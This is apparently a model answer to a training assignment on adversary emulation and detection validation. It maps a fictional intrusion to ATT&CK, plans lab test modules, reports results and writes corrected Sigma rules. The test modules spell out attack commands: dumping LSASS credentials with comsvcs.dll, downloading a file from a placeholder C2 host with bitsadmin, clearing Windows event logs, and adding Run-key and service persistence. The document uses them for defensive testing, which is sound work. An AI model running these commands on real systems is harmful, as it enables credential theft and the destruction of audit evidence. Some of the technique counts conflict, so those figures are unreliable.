# Solution: Assignment 4 — Adversary Emulation: Operation Desert Cipher

> **Model answer. All data is fictional.**

---

## Task 1 — TTP Extraction from Operation Desert Cipher

> **Tools:** [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) *(open-source)* · [TRAM](https://github.com/center-for-threat-informed-defense/tram) *(open-source)* · [OpenCTI](https://www.opencti.io/) *(open-source)* · [MISP](https://www.misp-project.org/) *(open-source)* · [Sigma](https://sigmahq.io/) *(open-source)*
>
> ATT&CK Navigator: create a layer from the 14 extracted techniques; color-code by confidence (high/medium/low) and emulation status — export as JSON for comparison with the coverage layer in Task 4. TRAM: use as a first-pass ML-assisted mapper on the Operation Desert Cipher report text — auto-suggests ATT&CK technique mappings; validate each suggestion manually against the evidence quote. OpenCTI: import the Desert Cipher report as an OpenCTI Report object; extracted TTPs auto-link to ATT&CK technique objects via relationship graph. MISP: tag report indicators with ATT&CK Galaxy entries for structured partner sharing. Sigma: search the SigmaHQ rule repository for existing community rules per technique before writing new ones.

### Extracted TTPs

| # | Behavior (from report) | Tactic | Technique | Sub | Evidence Ref | Conf | Emulate? |
|---|---|---|---|---|---|---|---|
| 1 | Actor sends spearphishing email with document lure; macro drops PowerShell stager | Initial Access | T1566.001 | — | Report §2.1 | High | No — requires email infrastructure; test at email gateway layer separately |
| 2 | PowerShell encoded command execution after macro | Execution | T1059.001 | — | Report §2.1 | High | Yes |
| 3 | AiTM proxy kit captures M365 session token, bypassing TOTP | Credential Access | T1557 | — | Report §2.2 | High | No — cannot safely emulate AiTM in lab without risk of production token capture |
| 4 | Actor uses stolen session token to authenticate to VPN | Initial Access | T1133 | — | Report §2.2 | High | Yes — simulate off-hours logon from non-corporate IP using test credential |
| 5 | `net user /domain`, `net group "Domain Admins"`, `ipconfig /all` on entry host | Discovery | T1087.002; T1016 | — | Report §2.3 | High | Yes |
| 6 | DNS resolution of internal target server name | Discovery | T1018 | — | Report §2.3 | High | Yes — included in discovery module |
| 7 | RDP lateral movement from jump host to target server | Lateral Movement | T1021.001 | — | Report §2.3 | High | Yes |
| 8 | `comsvcs.dll MiniDump` LSASS dump; GrantedAccess 0x1410 | Credential Access | T1003.001 | comsvcs.dll | Report §2.4 | High | Yes |
| 9 | BITS job downloads second-stage tool from C2 | Persistence; Defense Evasion | T1197 | — | Report §2.4 | High | Yes |
| 10 | Service installed from non-standard path (`C:\Windows\Temp\`) | Persistence | T1543.003 | — | Report §2.5 | High | Yes |
| 11 | Database tool misused for full-table SQL query and staging | Collection | T1005; T1074.001 | — | Report §2.5 | High | Yes (adapted to lab database) |
| 12 | Multi-chunk HTTPS exfiltration to C2 via BITS | Exfiltration | T1041; T1197 | — | Report §2.6 | High | Yes — use lab C2 endpoint |
| 13 | `wevtutil cl` Security, System, Application | Defense Evasion | T1070.001 | Clear Windows Event Logs | Report §2.6 | High | Yes — run LAST |
| 14 | Registry Run Key for autostart of second-stage (AMSI log evidence) | Persistence | T1547.001 | — | Report §2.4 (AMSI log excerpt) | Medium | Yes |

**Total TTPs:** 14 | **Emulation candidates:** 11 (exclude: T1566.001, T1557, and will adapt T1133)

---

## Task 2 — Emulation Plan

> **Tools:** [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) *(open-source)* · [MITRE CALDERA](https://caldera.mitre.org/) *(open-source)* · [Invoke-AtomicRedTeam](https://github.com/redcanaryco/invoke-atomicredteam) *(open-source)* · [VECTR](https://vectr.io/) *(open-source)*
>
> Atomic Red Team: pre-built atomic tests for all 11 emulated techniques — use the exact atomic test ID as the emulation command in each test module; avoids writing custom scripts. Invoke-AtomicRedTeam: PowerShell wrapper to execute atomics with `--ExecutionLogPath` flag — saves a timestamped execution log per atomic for cross-reference with SIEM alert timestamps. MITRE CALDERA: chain the 11 modules into a sequential scenario; built-in ATT&CK mapping; supports the kill chain ordering required by the emulation sequence. VECTR: plan and document each module from pre-execution through results — the project management layer for the entire exercise; tracks owner, target, and pass criterion per module.

### Test Modules

---

**MOD-01: Off-Hours VPN Logon from Non-Corporate ASN**
- ATT&CK: T1133 (adapted; simulates post-AiTM credential use)
- Detection under test: DET-001 (VPN ASN anomaly rule — if deployed)
- Command: Authenticate to test VPN gateway using test contractor credential from a CyberShield-hosted VPS with non-corporate ASN; timestamp: 02:00 IST
- Pass: Alert fires within 5 min; captures source IP, ASN, user, timestamp
- Execution account: test_contractor_01 (non-privileged)

**MOD-02: Discovery Commands**
- ATT&CK: T1087.002 + T1016 + T1018
- Detection: None expected (no detection deployed for net.exe)
- Commands: `net user /domain` → `net group "Domain Admins" /domain` → `ipconfig /all` → `nslookup [target-server].lab`
- Pass: *Intentionally testing for gap* — alert should NOT fire (no rule); document gap
- Execution account: test_contractor_01

**MOD-03: RDP Lateral Movement from DMZ to Operational Segment**
- ATT&CK: T1021.001
- Detection: DET-LM-001 (lateral movement rule)
- Command: `mstsc /v:[target-lab-host]` from JUMPHOST-LAB
- Pass: Alert fires within 35 min (known delay acknowledged); source: JUMPHOST-LAB (DMZ subnet); destination: [target] (Ops subnet)
- Execution account: test_contractor_01 (with RDP access to lab target)

**MOD-04: LSASS Dump via comsvcs.dll**
- ATT&CK: T1003.001
- Detection: DET-LSASS-001
- Command: `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\Windows\Temp\test.dmp full`
- Pass: Alert fires within 5 min; GrantedAccess value captured; process ancestry captured
- FP test (run separately): simulate backup tool LSASS access; confirm rule suppresses it
- Execution account: SYSTEM (via scheduled task in lab)

**MOD-05: BITS Job to External Lab C2**
- ATT&CK: T1197
- Detection: DET-BITS-001
- Command: `bitsadmin /transfer testjob /download /priority normal "https://[cyberShield-lab-C2]/test.bin" "C:\Windows\Temp\test.bin"`
- Pass: Alert fires within 10 min; captures BITS job name, destination domain, source host
- Gap check: Run same command on systems where rule is NOT deployed; confirm gap

**MOD-06: Service Installation from Non-Standard Path**
- ATT&CK: T1543.003
- Detection: DET-SVC-001
- Command: `sc create TestSvcMonitor binpath= "C:\Windows\Temp\svchost.exe"` + `sc start TestSvcMonitor`
- Pass: Alert fires within 5 min; EID 7045 captured; service path flagged as non-standard
- Execution account: SYSTEM

**MOD-07: Registry Run Key Persistence**
- ATT&CK: T1547.001
- Detection: DET-REG-001 (if deployed)
- Command: `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsMonitor" /t REG_SZ /d "C:\Windows\Temp\svchost.exe"`
- Pass: Alert fires within 5 min
- HKCU gap issue: Sysmon registry monitoring may not cover HKCU; document gap if rule misses HKCU

**MOD-08: Full-Table Database Query (Collection)**
- ATT&CK: T1005 + T1074.001
- Detection: DET-DB-001 (if deployed for lab database)
- Command: Lab-specific database query using internal query tool equivalent; full-table SELECT
- Pass: Alert fires within 5 min; query content captured; executing account logged

**MOD-09: HTTPS Exfiltration to Lab C2 (Multi-Chunk)**
- ATT&CK: T1041 + T1197
- Detection: DET-EXFIL-001 (volume-based) if deployed
- Action: BITS-mediated HTTPS transfer of 100MB test file in 5 chunks to CyberShield lab C2
- Pass: Volume threshold alert fires; total bytes to non-corporate destination captured
- Note: If no volume detection rule exists, this module documents a critical gap

**MOD-10: PowerShell Encoded Command Execution**
- ATT&CK: T1059.001
- Detection: DET-PS-001
- Command: `powershell.exe -EncodedCommand [base64 of "Write-Host 'emulation test'"]`
- Pass: Alert fires; decoded command visible in alert; encoding flag captured

**MOD-11: wevtutil Log Clear (RUN LAST)**
- ATT&CK: T1070.001
- Detection: DET-004 (wevtutil rule — known to be deployed and working from prior validation)
- Command: `wevtutil cl Security` + `wevtutil cl System` + `wevtutil cl Application`
- Pass: Alert fires within 2 min; EID 1102 captured

---

## Task 3 — Results

> **Tools:** [VECTR](https://vectr.io/) *(open-source)* · [Elastic Security / Kibana](https://www.elastic.co/security) *(open-source core)* · [Hayabusa](https://github.com/Yamato-Security/hayabusa) *(open-source)* · [Chainsaw](https://github.com/WithSecureLabs/chainsaw) *(open-source)* · [Invoke-AtomicRedTeam](https://github.com/redcanaryco/invoke-atomicredteam) *(open-source)*
>
> VECTR: record PASS/PARTIAL/FAIL per module and generate the coverage percentage report automatically — no manual table assembly. Elastic Security: primary detection validation surface — query alert index for each module's expected alert after execution; confirm field values match pass criterion. Hayabusa: when Elastic doesn't fire, run Hayabusa against the lab host `.evtx` to check whether the event was even generated — separates "rule didn't fire" from "event wasn't logged." Chainsaw: rapid Sigma-based scan of local event logs — confirms whether raw evidence existed before blaming the SIEM rule. Invoke-AtomicRedTeam: `--ExecutionLogPath` saves a timestamped execution log — cross-reference with Elastic alert timestamps to calculate precise time-to-detection per module.

### Test Results Table

| Module | Technique | Result | Time to Detect | Alert Fields | Root Cause (failures) |
|---|---|---|---|---|---|
| MOD-01 | T1133 VPN off-hours | **PASS** | 3 min | source_ip, source_asn, user, timestamp | — |
| MOD-02 | T1087.002 Discovery | **FAIL (gap confirmed)** | N/A | — | No net.exe detection deployed; gap documented |
| MOD-03 | T1021.001 RDP | **PARTIAL** | 33 min | src_host, dst_host, user | Fired within delay window; missing: logon type field not populated in alert |
| MOD-04 | T1003.001 LSASS | **PASS** | 2 min | GrantedAccess, pid, Image, CommandLine | — |
| MOD-04 FP test | T1003.001 backup FP | **PASS (suppressed)** | — | — | Backup tool correctly suppressed |
| MOD-05 | T1197 BITS | **PARTIAL** | 7 min | job_name, dst_domain | Missing: src_host not populated; bug in rule field mapping |
| MOD-06 | T1543.003 Service | **PASS** | 4 min | ServiceName, ServiceFileName, path_flag | — |
| MOD-07 | T1547.001 Registry Run | **FAIL** | N/A | — | Sysmon registry monitoring covers HKLM but NOT HKCU — known Sysmon limitation |
| MOD-08 | T1005 DB Query | **PASS** | 3 min | query_text, account, table_name | — |
| MOD-09 | T1041 Exfiltration | **FAIL (gap)** | N/A | — | No volume-based exfiltration rule deployed |
| MOD-10 | T1059.001 PowerShell | **PASS** | 1 min | CommandLine (encoded), decoded content | — |
| MOD-11 | T1070.001 Log clear | **PASS** | 1 min | EventID 1102, host, timestamp | — |

**Summary:** 6 PASS / 2 PARTIAL / 3 FAIL (2 gaps + 1 architecture limit)

---

### Failure Analyses

**MOD-02 — Discovery (T1087.002): Gap Confirmed**

*Failure type:* Rule missing — no detection for `net.exe` domain enumeration

*Risk:* Adversary can perform complete domain/group/host reconnaissance on the entry host with zero detection. In the Operation Desert Cipher incident, this phase lasted 8 minutes and provided all information needed for the subsequent lateral movement. Undetected for the full dwell time.

*Remediation:* Deploy Sigma rule detecting `net.exe` with `/domain` flag or `group "Domain Admins"` argument. Estimated: 1 engineering day.

---

**MOD-05 — BITS Job (T1197): src_host Field Missing**

*Failure type:* Rule logic error — `src_host` field not mapped in Elastic ingest pipeline; rule queries `host.name` but Winlogbeat ships this field as `agent.hostname` on this OS version.

*Risk:* Alert fires (correct) but investigator cannot immediately identify which host made the BITS job without manual correlation. Adds 5–10 minutes to response. Under a 4-hour dwell time this is acceptable; under a 30-minute exfil window it is not.

*Remediation:* Add field alias in Elastic ingest pipeline: `host.name` → `agent.hostname`. Estimated: 2 hours.

---

**MOD-07 — Registry Run Key (T1547.001): HKCU Not Covered**

*Failure type:* Architectural — Sysmon's registry event collection (EID 13) covers `HKLM` by default; `HKCU` requires explicit Sysmon configuration.

*Risk:* Adversary can persist via HKCU Run key (user-level persistence; no admin rights needed) with zero detection. The Operation Desert Cipher report notes HKCU registry persistence was used as a secondary persistence mechanism.

*Remediation:* Update Sysmon configuration to add HKCU registry path to EID 13 filter rules. Requires change control and Sysmon reconfiguration on all hosts. Estimated: 3 engineering days (config + CAB + rollout).

---

**MOD-09 — Exfiltration Volume (T1041): No Rule**

*Failure type:* Rule missing — no large-volume outbound HTTPS rule deployed

*Risk:* Most critical gap. In the Operation Desert Cipher incident, 2.4 GB was exfiltrated in 8 chunks over 3 hours. Zero detection in current state. An adversary can exfil entire R&D datasets without any alert.

*Remediation:* Deploy network-layer volume anomaly rule: HTTPS outbound bytes > 500 MB in 6-hour window to non-CDN ASN. Requires firewall/NetFlow log ingestion into SIEM. Estimated: 5 engineering days.

---

## Task 4 — Coverage Matrix

> **Tools:** [DeTT&CT](https://github.com/rabobank-cdc/DeTTECT) *(open-source)* · [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) *(open-source)* · [VECTR](https://vectr.io/) *(open-source)* · [OpenCTI](https://www.opencti.io/) *(open-source)*
>
> DeTT&CT: score data sources and detection rules per ATT&CK technique; produce a coverage YAML file that renders as a Navigator layer — PASS/PARTIAL/GAP maps directly to its scoring model. ATT&CK Navigator: overlay the emulation results layer against the Desert Cipher threat scenario layer — gaps are visually obvious where scenario techniques appear but the detection layer is empty or red. VECTR: export the coverage matrix directly from test records — no manual table construction. OpenCTI: link coverage status back to the Desert Cipher threat actor object so the gap backlog is visible in the context of the threat that motivated the exercise.

| # | Technique | System | Rule | Emulation | Coverage | Gap Priority |
|---|---|---|---|---|---|---|
| 1 | T1566.001 Spearphishing | Email GW | Email GW policy | Not emulated | Partial (GW blocks EXE; macros not blocked) | P2 |
| 2 | T1059.001 PowerShell enc | All | DET-PS-001 | PASS | Full | — |
| 3 | T1557 AiTM | VPN GW | DET-001 | Not emulated | Partial (VPN ASN rule, not true AiTM) | P1 |
| 4 | T1133 VPN external | VPN GW | DET-001 | PASS | Full | — |
| 5 | T1087.002 Domain Discovery | Domain-joined | NONE | FAIL (gap) | Gap | P2 |
| 6 | T1016 Network Info | Entry host | NONE | FAIL (gap) | Gap | P3 |
| 7 | T1018 Remote System Discovery | Entry host | NONE | FAIL (gap) | Gap | P3 |
| 8 | T1021.001 RDP lateral | DMZ → Ops | DET-LM-001 | PARTIAL | Partial (missing field) | P2 |
| 9 | T1003.001 LSASS comsvcs | Target host | DET-LSASS-001 | PASS | Full | — |
| 10 | T1197 BITS Persistence | Target host | DET-BITS-001 | PARTIAL (field bug) | Partial | P2 |
| 11 | T1543.003 Service Install | Target host | DET-SVC-001 | PASS | Full | — |
| 12 | T1547.001 Registry Run HKCU | Target host | DET-REG-001 | FAIL (HKCU gap) | Gap | P1 |
| 13 | T1005 DB Collection | DB host | DET-DB-001 | PASS | Full | — |
| 14 | T1041 + T1197 Exfiltration | Network | NONE | FAIL (gap) | Gap | P1 |
| 15 | T1070.001 Log Clear | All | DET-004 | PASS | Full | — |

**Coverage:** 6 Full / 3 Partial / 4 Gap (2 P1, 1 P2 counted here) out of 14 emulated techniques
**Full coverage rate: 43% | Full + Partial: 64%**

---

## Task 5 — Gap Backlog

> **Tools:** [VECTR](https://vectr.io/) *(open-source)* · [GitLab Issues](https://about.gitlab.com/) *(open-source option)* · [DeTT&CT](https://github.com/rabobank-cdc/DeTTECT) *(open-source)*
>
> VECTR: export FAIL and PARTIAL results directly as gap backlog items — each item pre-populated with technique, test result, and failure analysis. GitLab Issues: create one issue per gap with P1/P2/P3 labels and milestone targeting for remediation deadline; self-hostable for environments where cloud SaaS is restricted. DeTT&CT: cross-reference the gap backlog against the data source quality scores to distinguish rule-logic gaps from log-source gaps — different remediation owners for each type.

| ID | Gap | ATT&CK | Root Cause | Remediation | Effort | Priority |
|---|---|---|---|---|---|---|
| GAP-001 | No exfiltration volume rule — adversary can exfil unlimited data over HTTPS | T1041, T1197 | Rule missing; requires NetFlow in SIEM | Deploy outbound HTTPS volume threshold rule (500 MB / 6h / non-CDN ASN) | 5d | P1 |
| GAP-002 | HKCU registry persistence not monitored | T1547.001 | Sysmon default config excludes HKCU | Update Sysmon config on all hosts to add HKCU EID 13 | 3d | P1 |
| GAP-003 | No domain discovery enumeration detection | T1087.002, T1016, T1018 | Rule missing | Deploy net.exe with /domain or group enumeration arguments rule | 1d | P2 |
| GAP-004 | RDP alert missing src_host field | T1021.001 | Elastic pipeline field mapping bug | Fix field alias in ingest pipeline | 0.25d | P2 |
| GAP-005 | BITS src_host field missing from alert | T1197 | Same pipeline mapping bug as GAP-004 | Fix field alias (same pipeline change as GAP-004) | 0d (same fix) | P2 |
| GAP-006 | Office macro → process chain not blocked at gateway | T1566.001 | Email gateway only blocks EXE attachments | Add DDEAUTO and macro-enabled attachment policy to email gateway | 2d | P2 |
| GAP-007 | AiTM session token capture not detectable at VPN layer | T1557 | No AiTM-specific detection; VPN ASN rule is proxy detection only | Evaluate VPN continuous authentication (step-up MFA on new ASN); not a SIEM rule | 10d | P1 |

---

## Task 6 — Corrected Rules

> **Tools:** [Sigma](https://sigmahq.io/) *(open-source)* · [Uncoder.io](https://uncoder.io/) *(free web tool)* · [Hayabusa](https://github.com/Yamato-Security/hayabusa) *(open-source)* · [Chainsaw](https://github.com/WithSecureLabs/chainsaw) *(open-source)*
>
> Sigma: write corrected rules in vendor-neutral YAML with the key change documented in an inline comment block; convert to target SIEM with pySigma. Uncoder.io: paste the corrected Sigma YAML and get an Elastic KQL equivalent immediately — test the KQL against the lab index before deploying the Sigma rule to production. Hayabusa: validate the HKCU registry rule against `.evtx` collected from the lab test run — confirms EID 13 events are present before blaming rule logic. Chainsaw: run both TP and FP simulation events through the corrected rule locally to verify suppression logic works as intended.

### GAP-001: HTTPS Exfiltration Volume Threshold

```yaml
title: Large-Volume Outbound HTTPS to Non-CDN Destination
id: e7f35061-8293-4045-e123-456789012345
status: experimental
description: >
  Detects large-volume HTTPS exfiltration (>500MB in 6 hours) to non-CDN,
  non-Microsoft ASNs. Based on Operation Desert Cipher exfiltration pattern.
author: CTI / Detection Engineering
date: 2024/11/20
tags:
  - attack.exfiltration
  - attack.t1041
  - attack.t1197
logsource:
  category: network_connection
  product: zeek  # or netflow
detection:
  # Requires pre-aggregated flow data with 6-hour windows
  # Implemented as Elastic SIEM aggregation rule, not single-event rule
  selection:
    destination.port: 443
    network.bytes_toserver|gte: 524288000  # 500 MB
  filter_cdns:
    destination.as.number:
      - 16509   # AWS
      - 8075    # Microsoft
      - 15169   # Google
      - 13335   # Cloudflare
      - 20940   # Akamai
  condition: selection and not filter_cdns
falsepositives:
  - 'Legitimate large backup jobs to cloud storage — add backup destination ASNs to filter'
  - 'Software deployment pipelines'
level: high
```

**Elastic Aggregation Rule (SIEM):**
```
# Index: filebeat-zeek-* or netflow-*
# Rule type: Threshold
# Threshold: sum(network.bytes) > 524288000 grouped by source.ip, destination.ip
# Time window: 6 hours

network.transport: tcp
AND destination.port: 443
AND NOT destination.as.number: (16509 OR 8075 OR 15169 OR 13335 OR 20940)
```

---

### GAP-002: Fix HKCU Registry Run Key Persistence

```yaml
title: Registry Run Key Persistence — HKCU (User-Level)
id: f8046172-9304-5156-f234-567890123456
status: experimental
description: >
  Detects registry write to HKCU Run keys — user-level persistence
  that does not require admin rights. Requires Sysmon EID 13 configured
  for HKCU path. NOTE: Sysmon config update required before deployment.
author: CTI / Detection Engineering
date: 2024/11/20
tags:
  - attack.persistence
  - attack.t1547.001
logsource:
  category: registry_set
  product: windows
detection:
  selection:
    EventType: SetValue
    TargetObject|contains:
      - '\Software\Microsoft\Windows\CurrentVersion\Run\'
      - '\Software\Microsoft\Windows\CurrentVersion\RunOnce\'
  filter_hklm:
    TargetObject|startswith: 'HKLM'  # HKLM covered by existing rule
  filter_legitimate:
    Details|contains:
      - 'OneDrive'
      - 'MicrosoftEdge'
      - 'Teams'
  condition: selection and not filter_hklm and not filter_legitimate
falsepositives:
  - 'Many legitimate applications use HKCU Run keys — FP rate is HIGH without environment baselining'
  - 'Tune by building allowlist of known-legitimate TargetObject+Details combinations'
level: medium
```

**Required Sysmon configuration addition:**
```xml
<RegistryEvent onmatch="include">
  <TargetObject condition="contains">
    \Software\Microsoft\Windows\CurrentVersion\Run
  </TargetObject>
  <TargetObject condition="contains">
    \Software\Microsoft\Windows\CurrentVersion\RunOnce
  </TargetObject>
</RegistryEvent>
```

---

## Task 7 — Compliance Report Summary

> **Tools:** [VECTR](https://vectr.io/) *(open-source)* · [LibreOffice Writer](https://www.libreoffice.org/) *(open-source)* · [DFIR-IRIS](https://dfir-iris.org/) *(open-source)*
>
> VECTR: generate the results summary table and coverage percentage directly from exercise records — the methodology and results sections of the compliance report assemble from VECTR exports. LibreOffice Writer: draft the full compliance report locally in a signed PDF format — required for BoI-CD 362 submissions; do not use cloud document editors for content under regulatory obligation. DFIR-IRIS: if any test module triggered an actual incident response action, DFIR-IRIS provides the evidentiary audit trail regulators may request.

**Operation Desert Cipher Detection Validation — Exercise Report**
*TechPay Israel / LifeTech Pharma — Lab Environment*
*BoI-CD 362 Section 6 Compliance | Date: [exercise date]*

**Status: COMPLIANT WITH CONDITIONS**

| Metric | Value |
|---|---|
| Techniques emulated | 11 |
| PASS | 6 (55%) |
| PARTIAL | 2 (18%) |
| FAIL (gaps confirmed) | 3 (27%) |
| P1 gaps identified | 3 |
| P1 gaps with remediation plan | 3 |
| P1 gap remediation deadline | [30 days] |

**Highest-priority finding:** Zero detection coverage for large-volume HTTPS exfiltration (GAP-001). In the Operation Desert Cipher pattern, 2.4 GB of R&D data was exfiltrated in 3 hours. Current state: no alert would fire. Remediation: 5 engineering days; compensating control: manual daily NetFlow review for anomalous outbound volumes.

**Compliance statement:** This exercise satisfies the annual detection validation requirement under BoI-CD 362 Section 6. The three identified P1 gaps have documented remediation plans with 30-day timelines. Compliant with conditions; full compliance upon gap remediation.

*Signed:* [CTI Lead] | [CISO] | [Date]
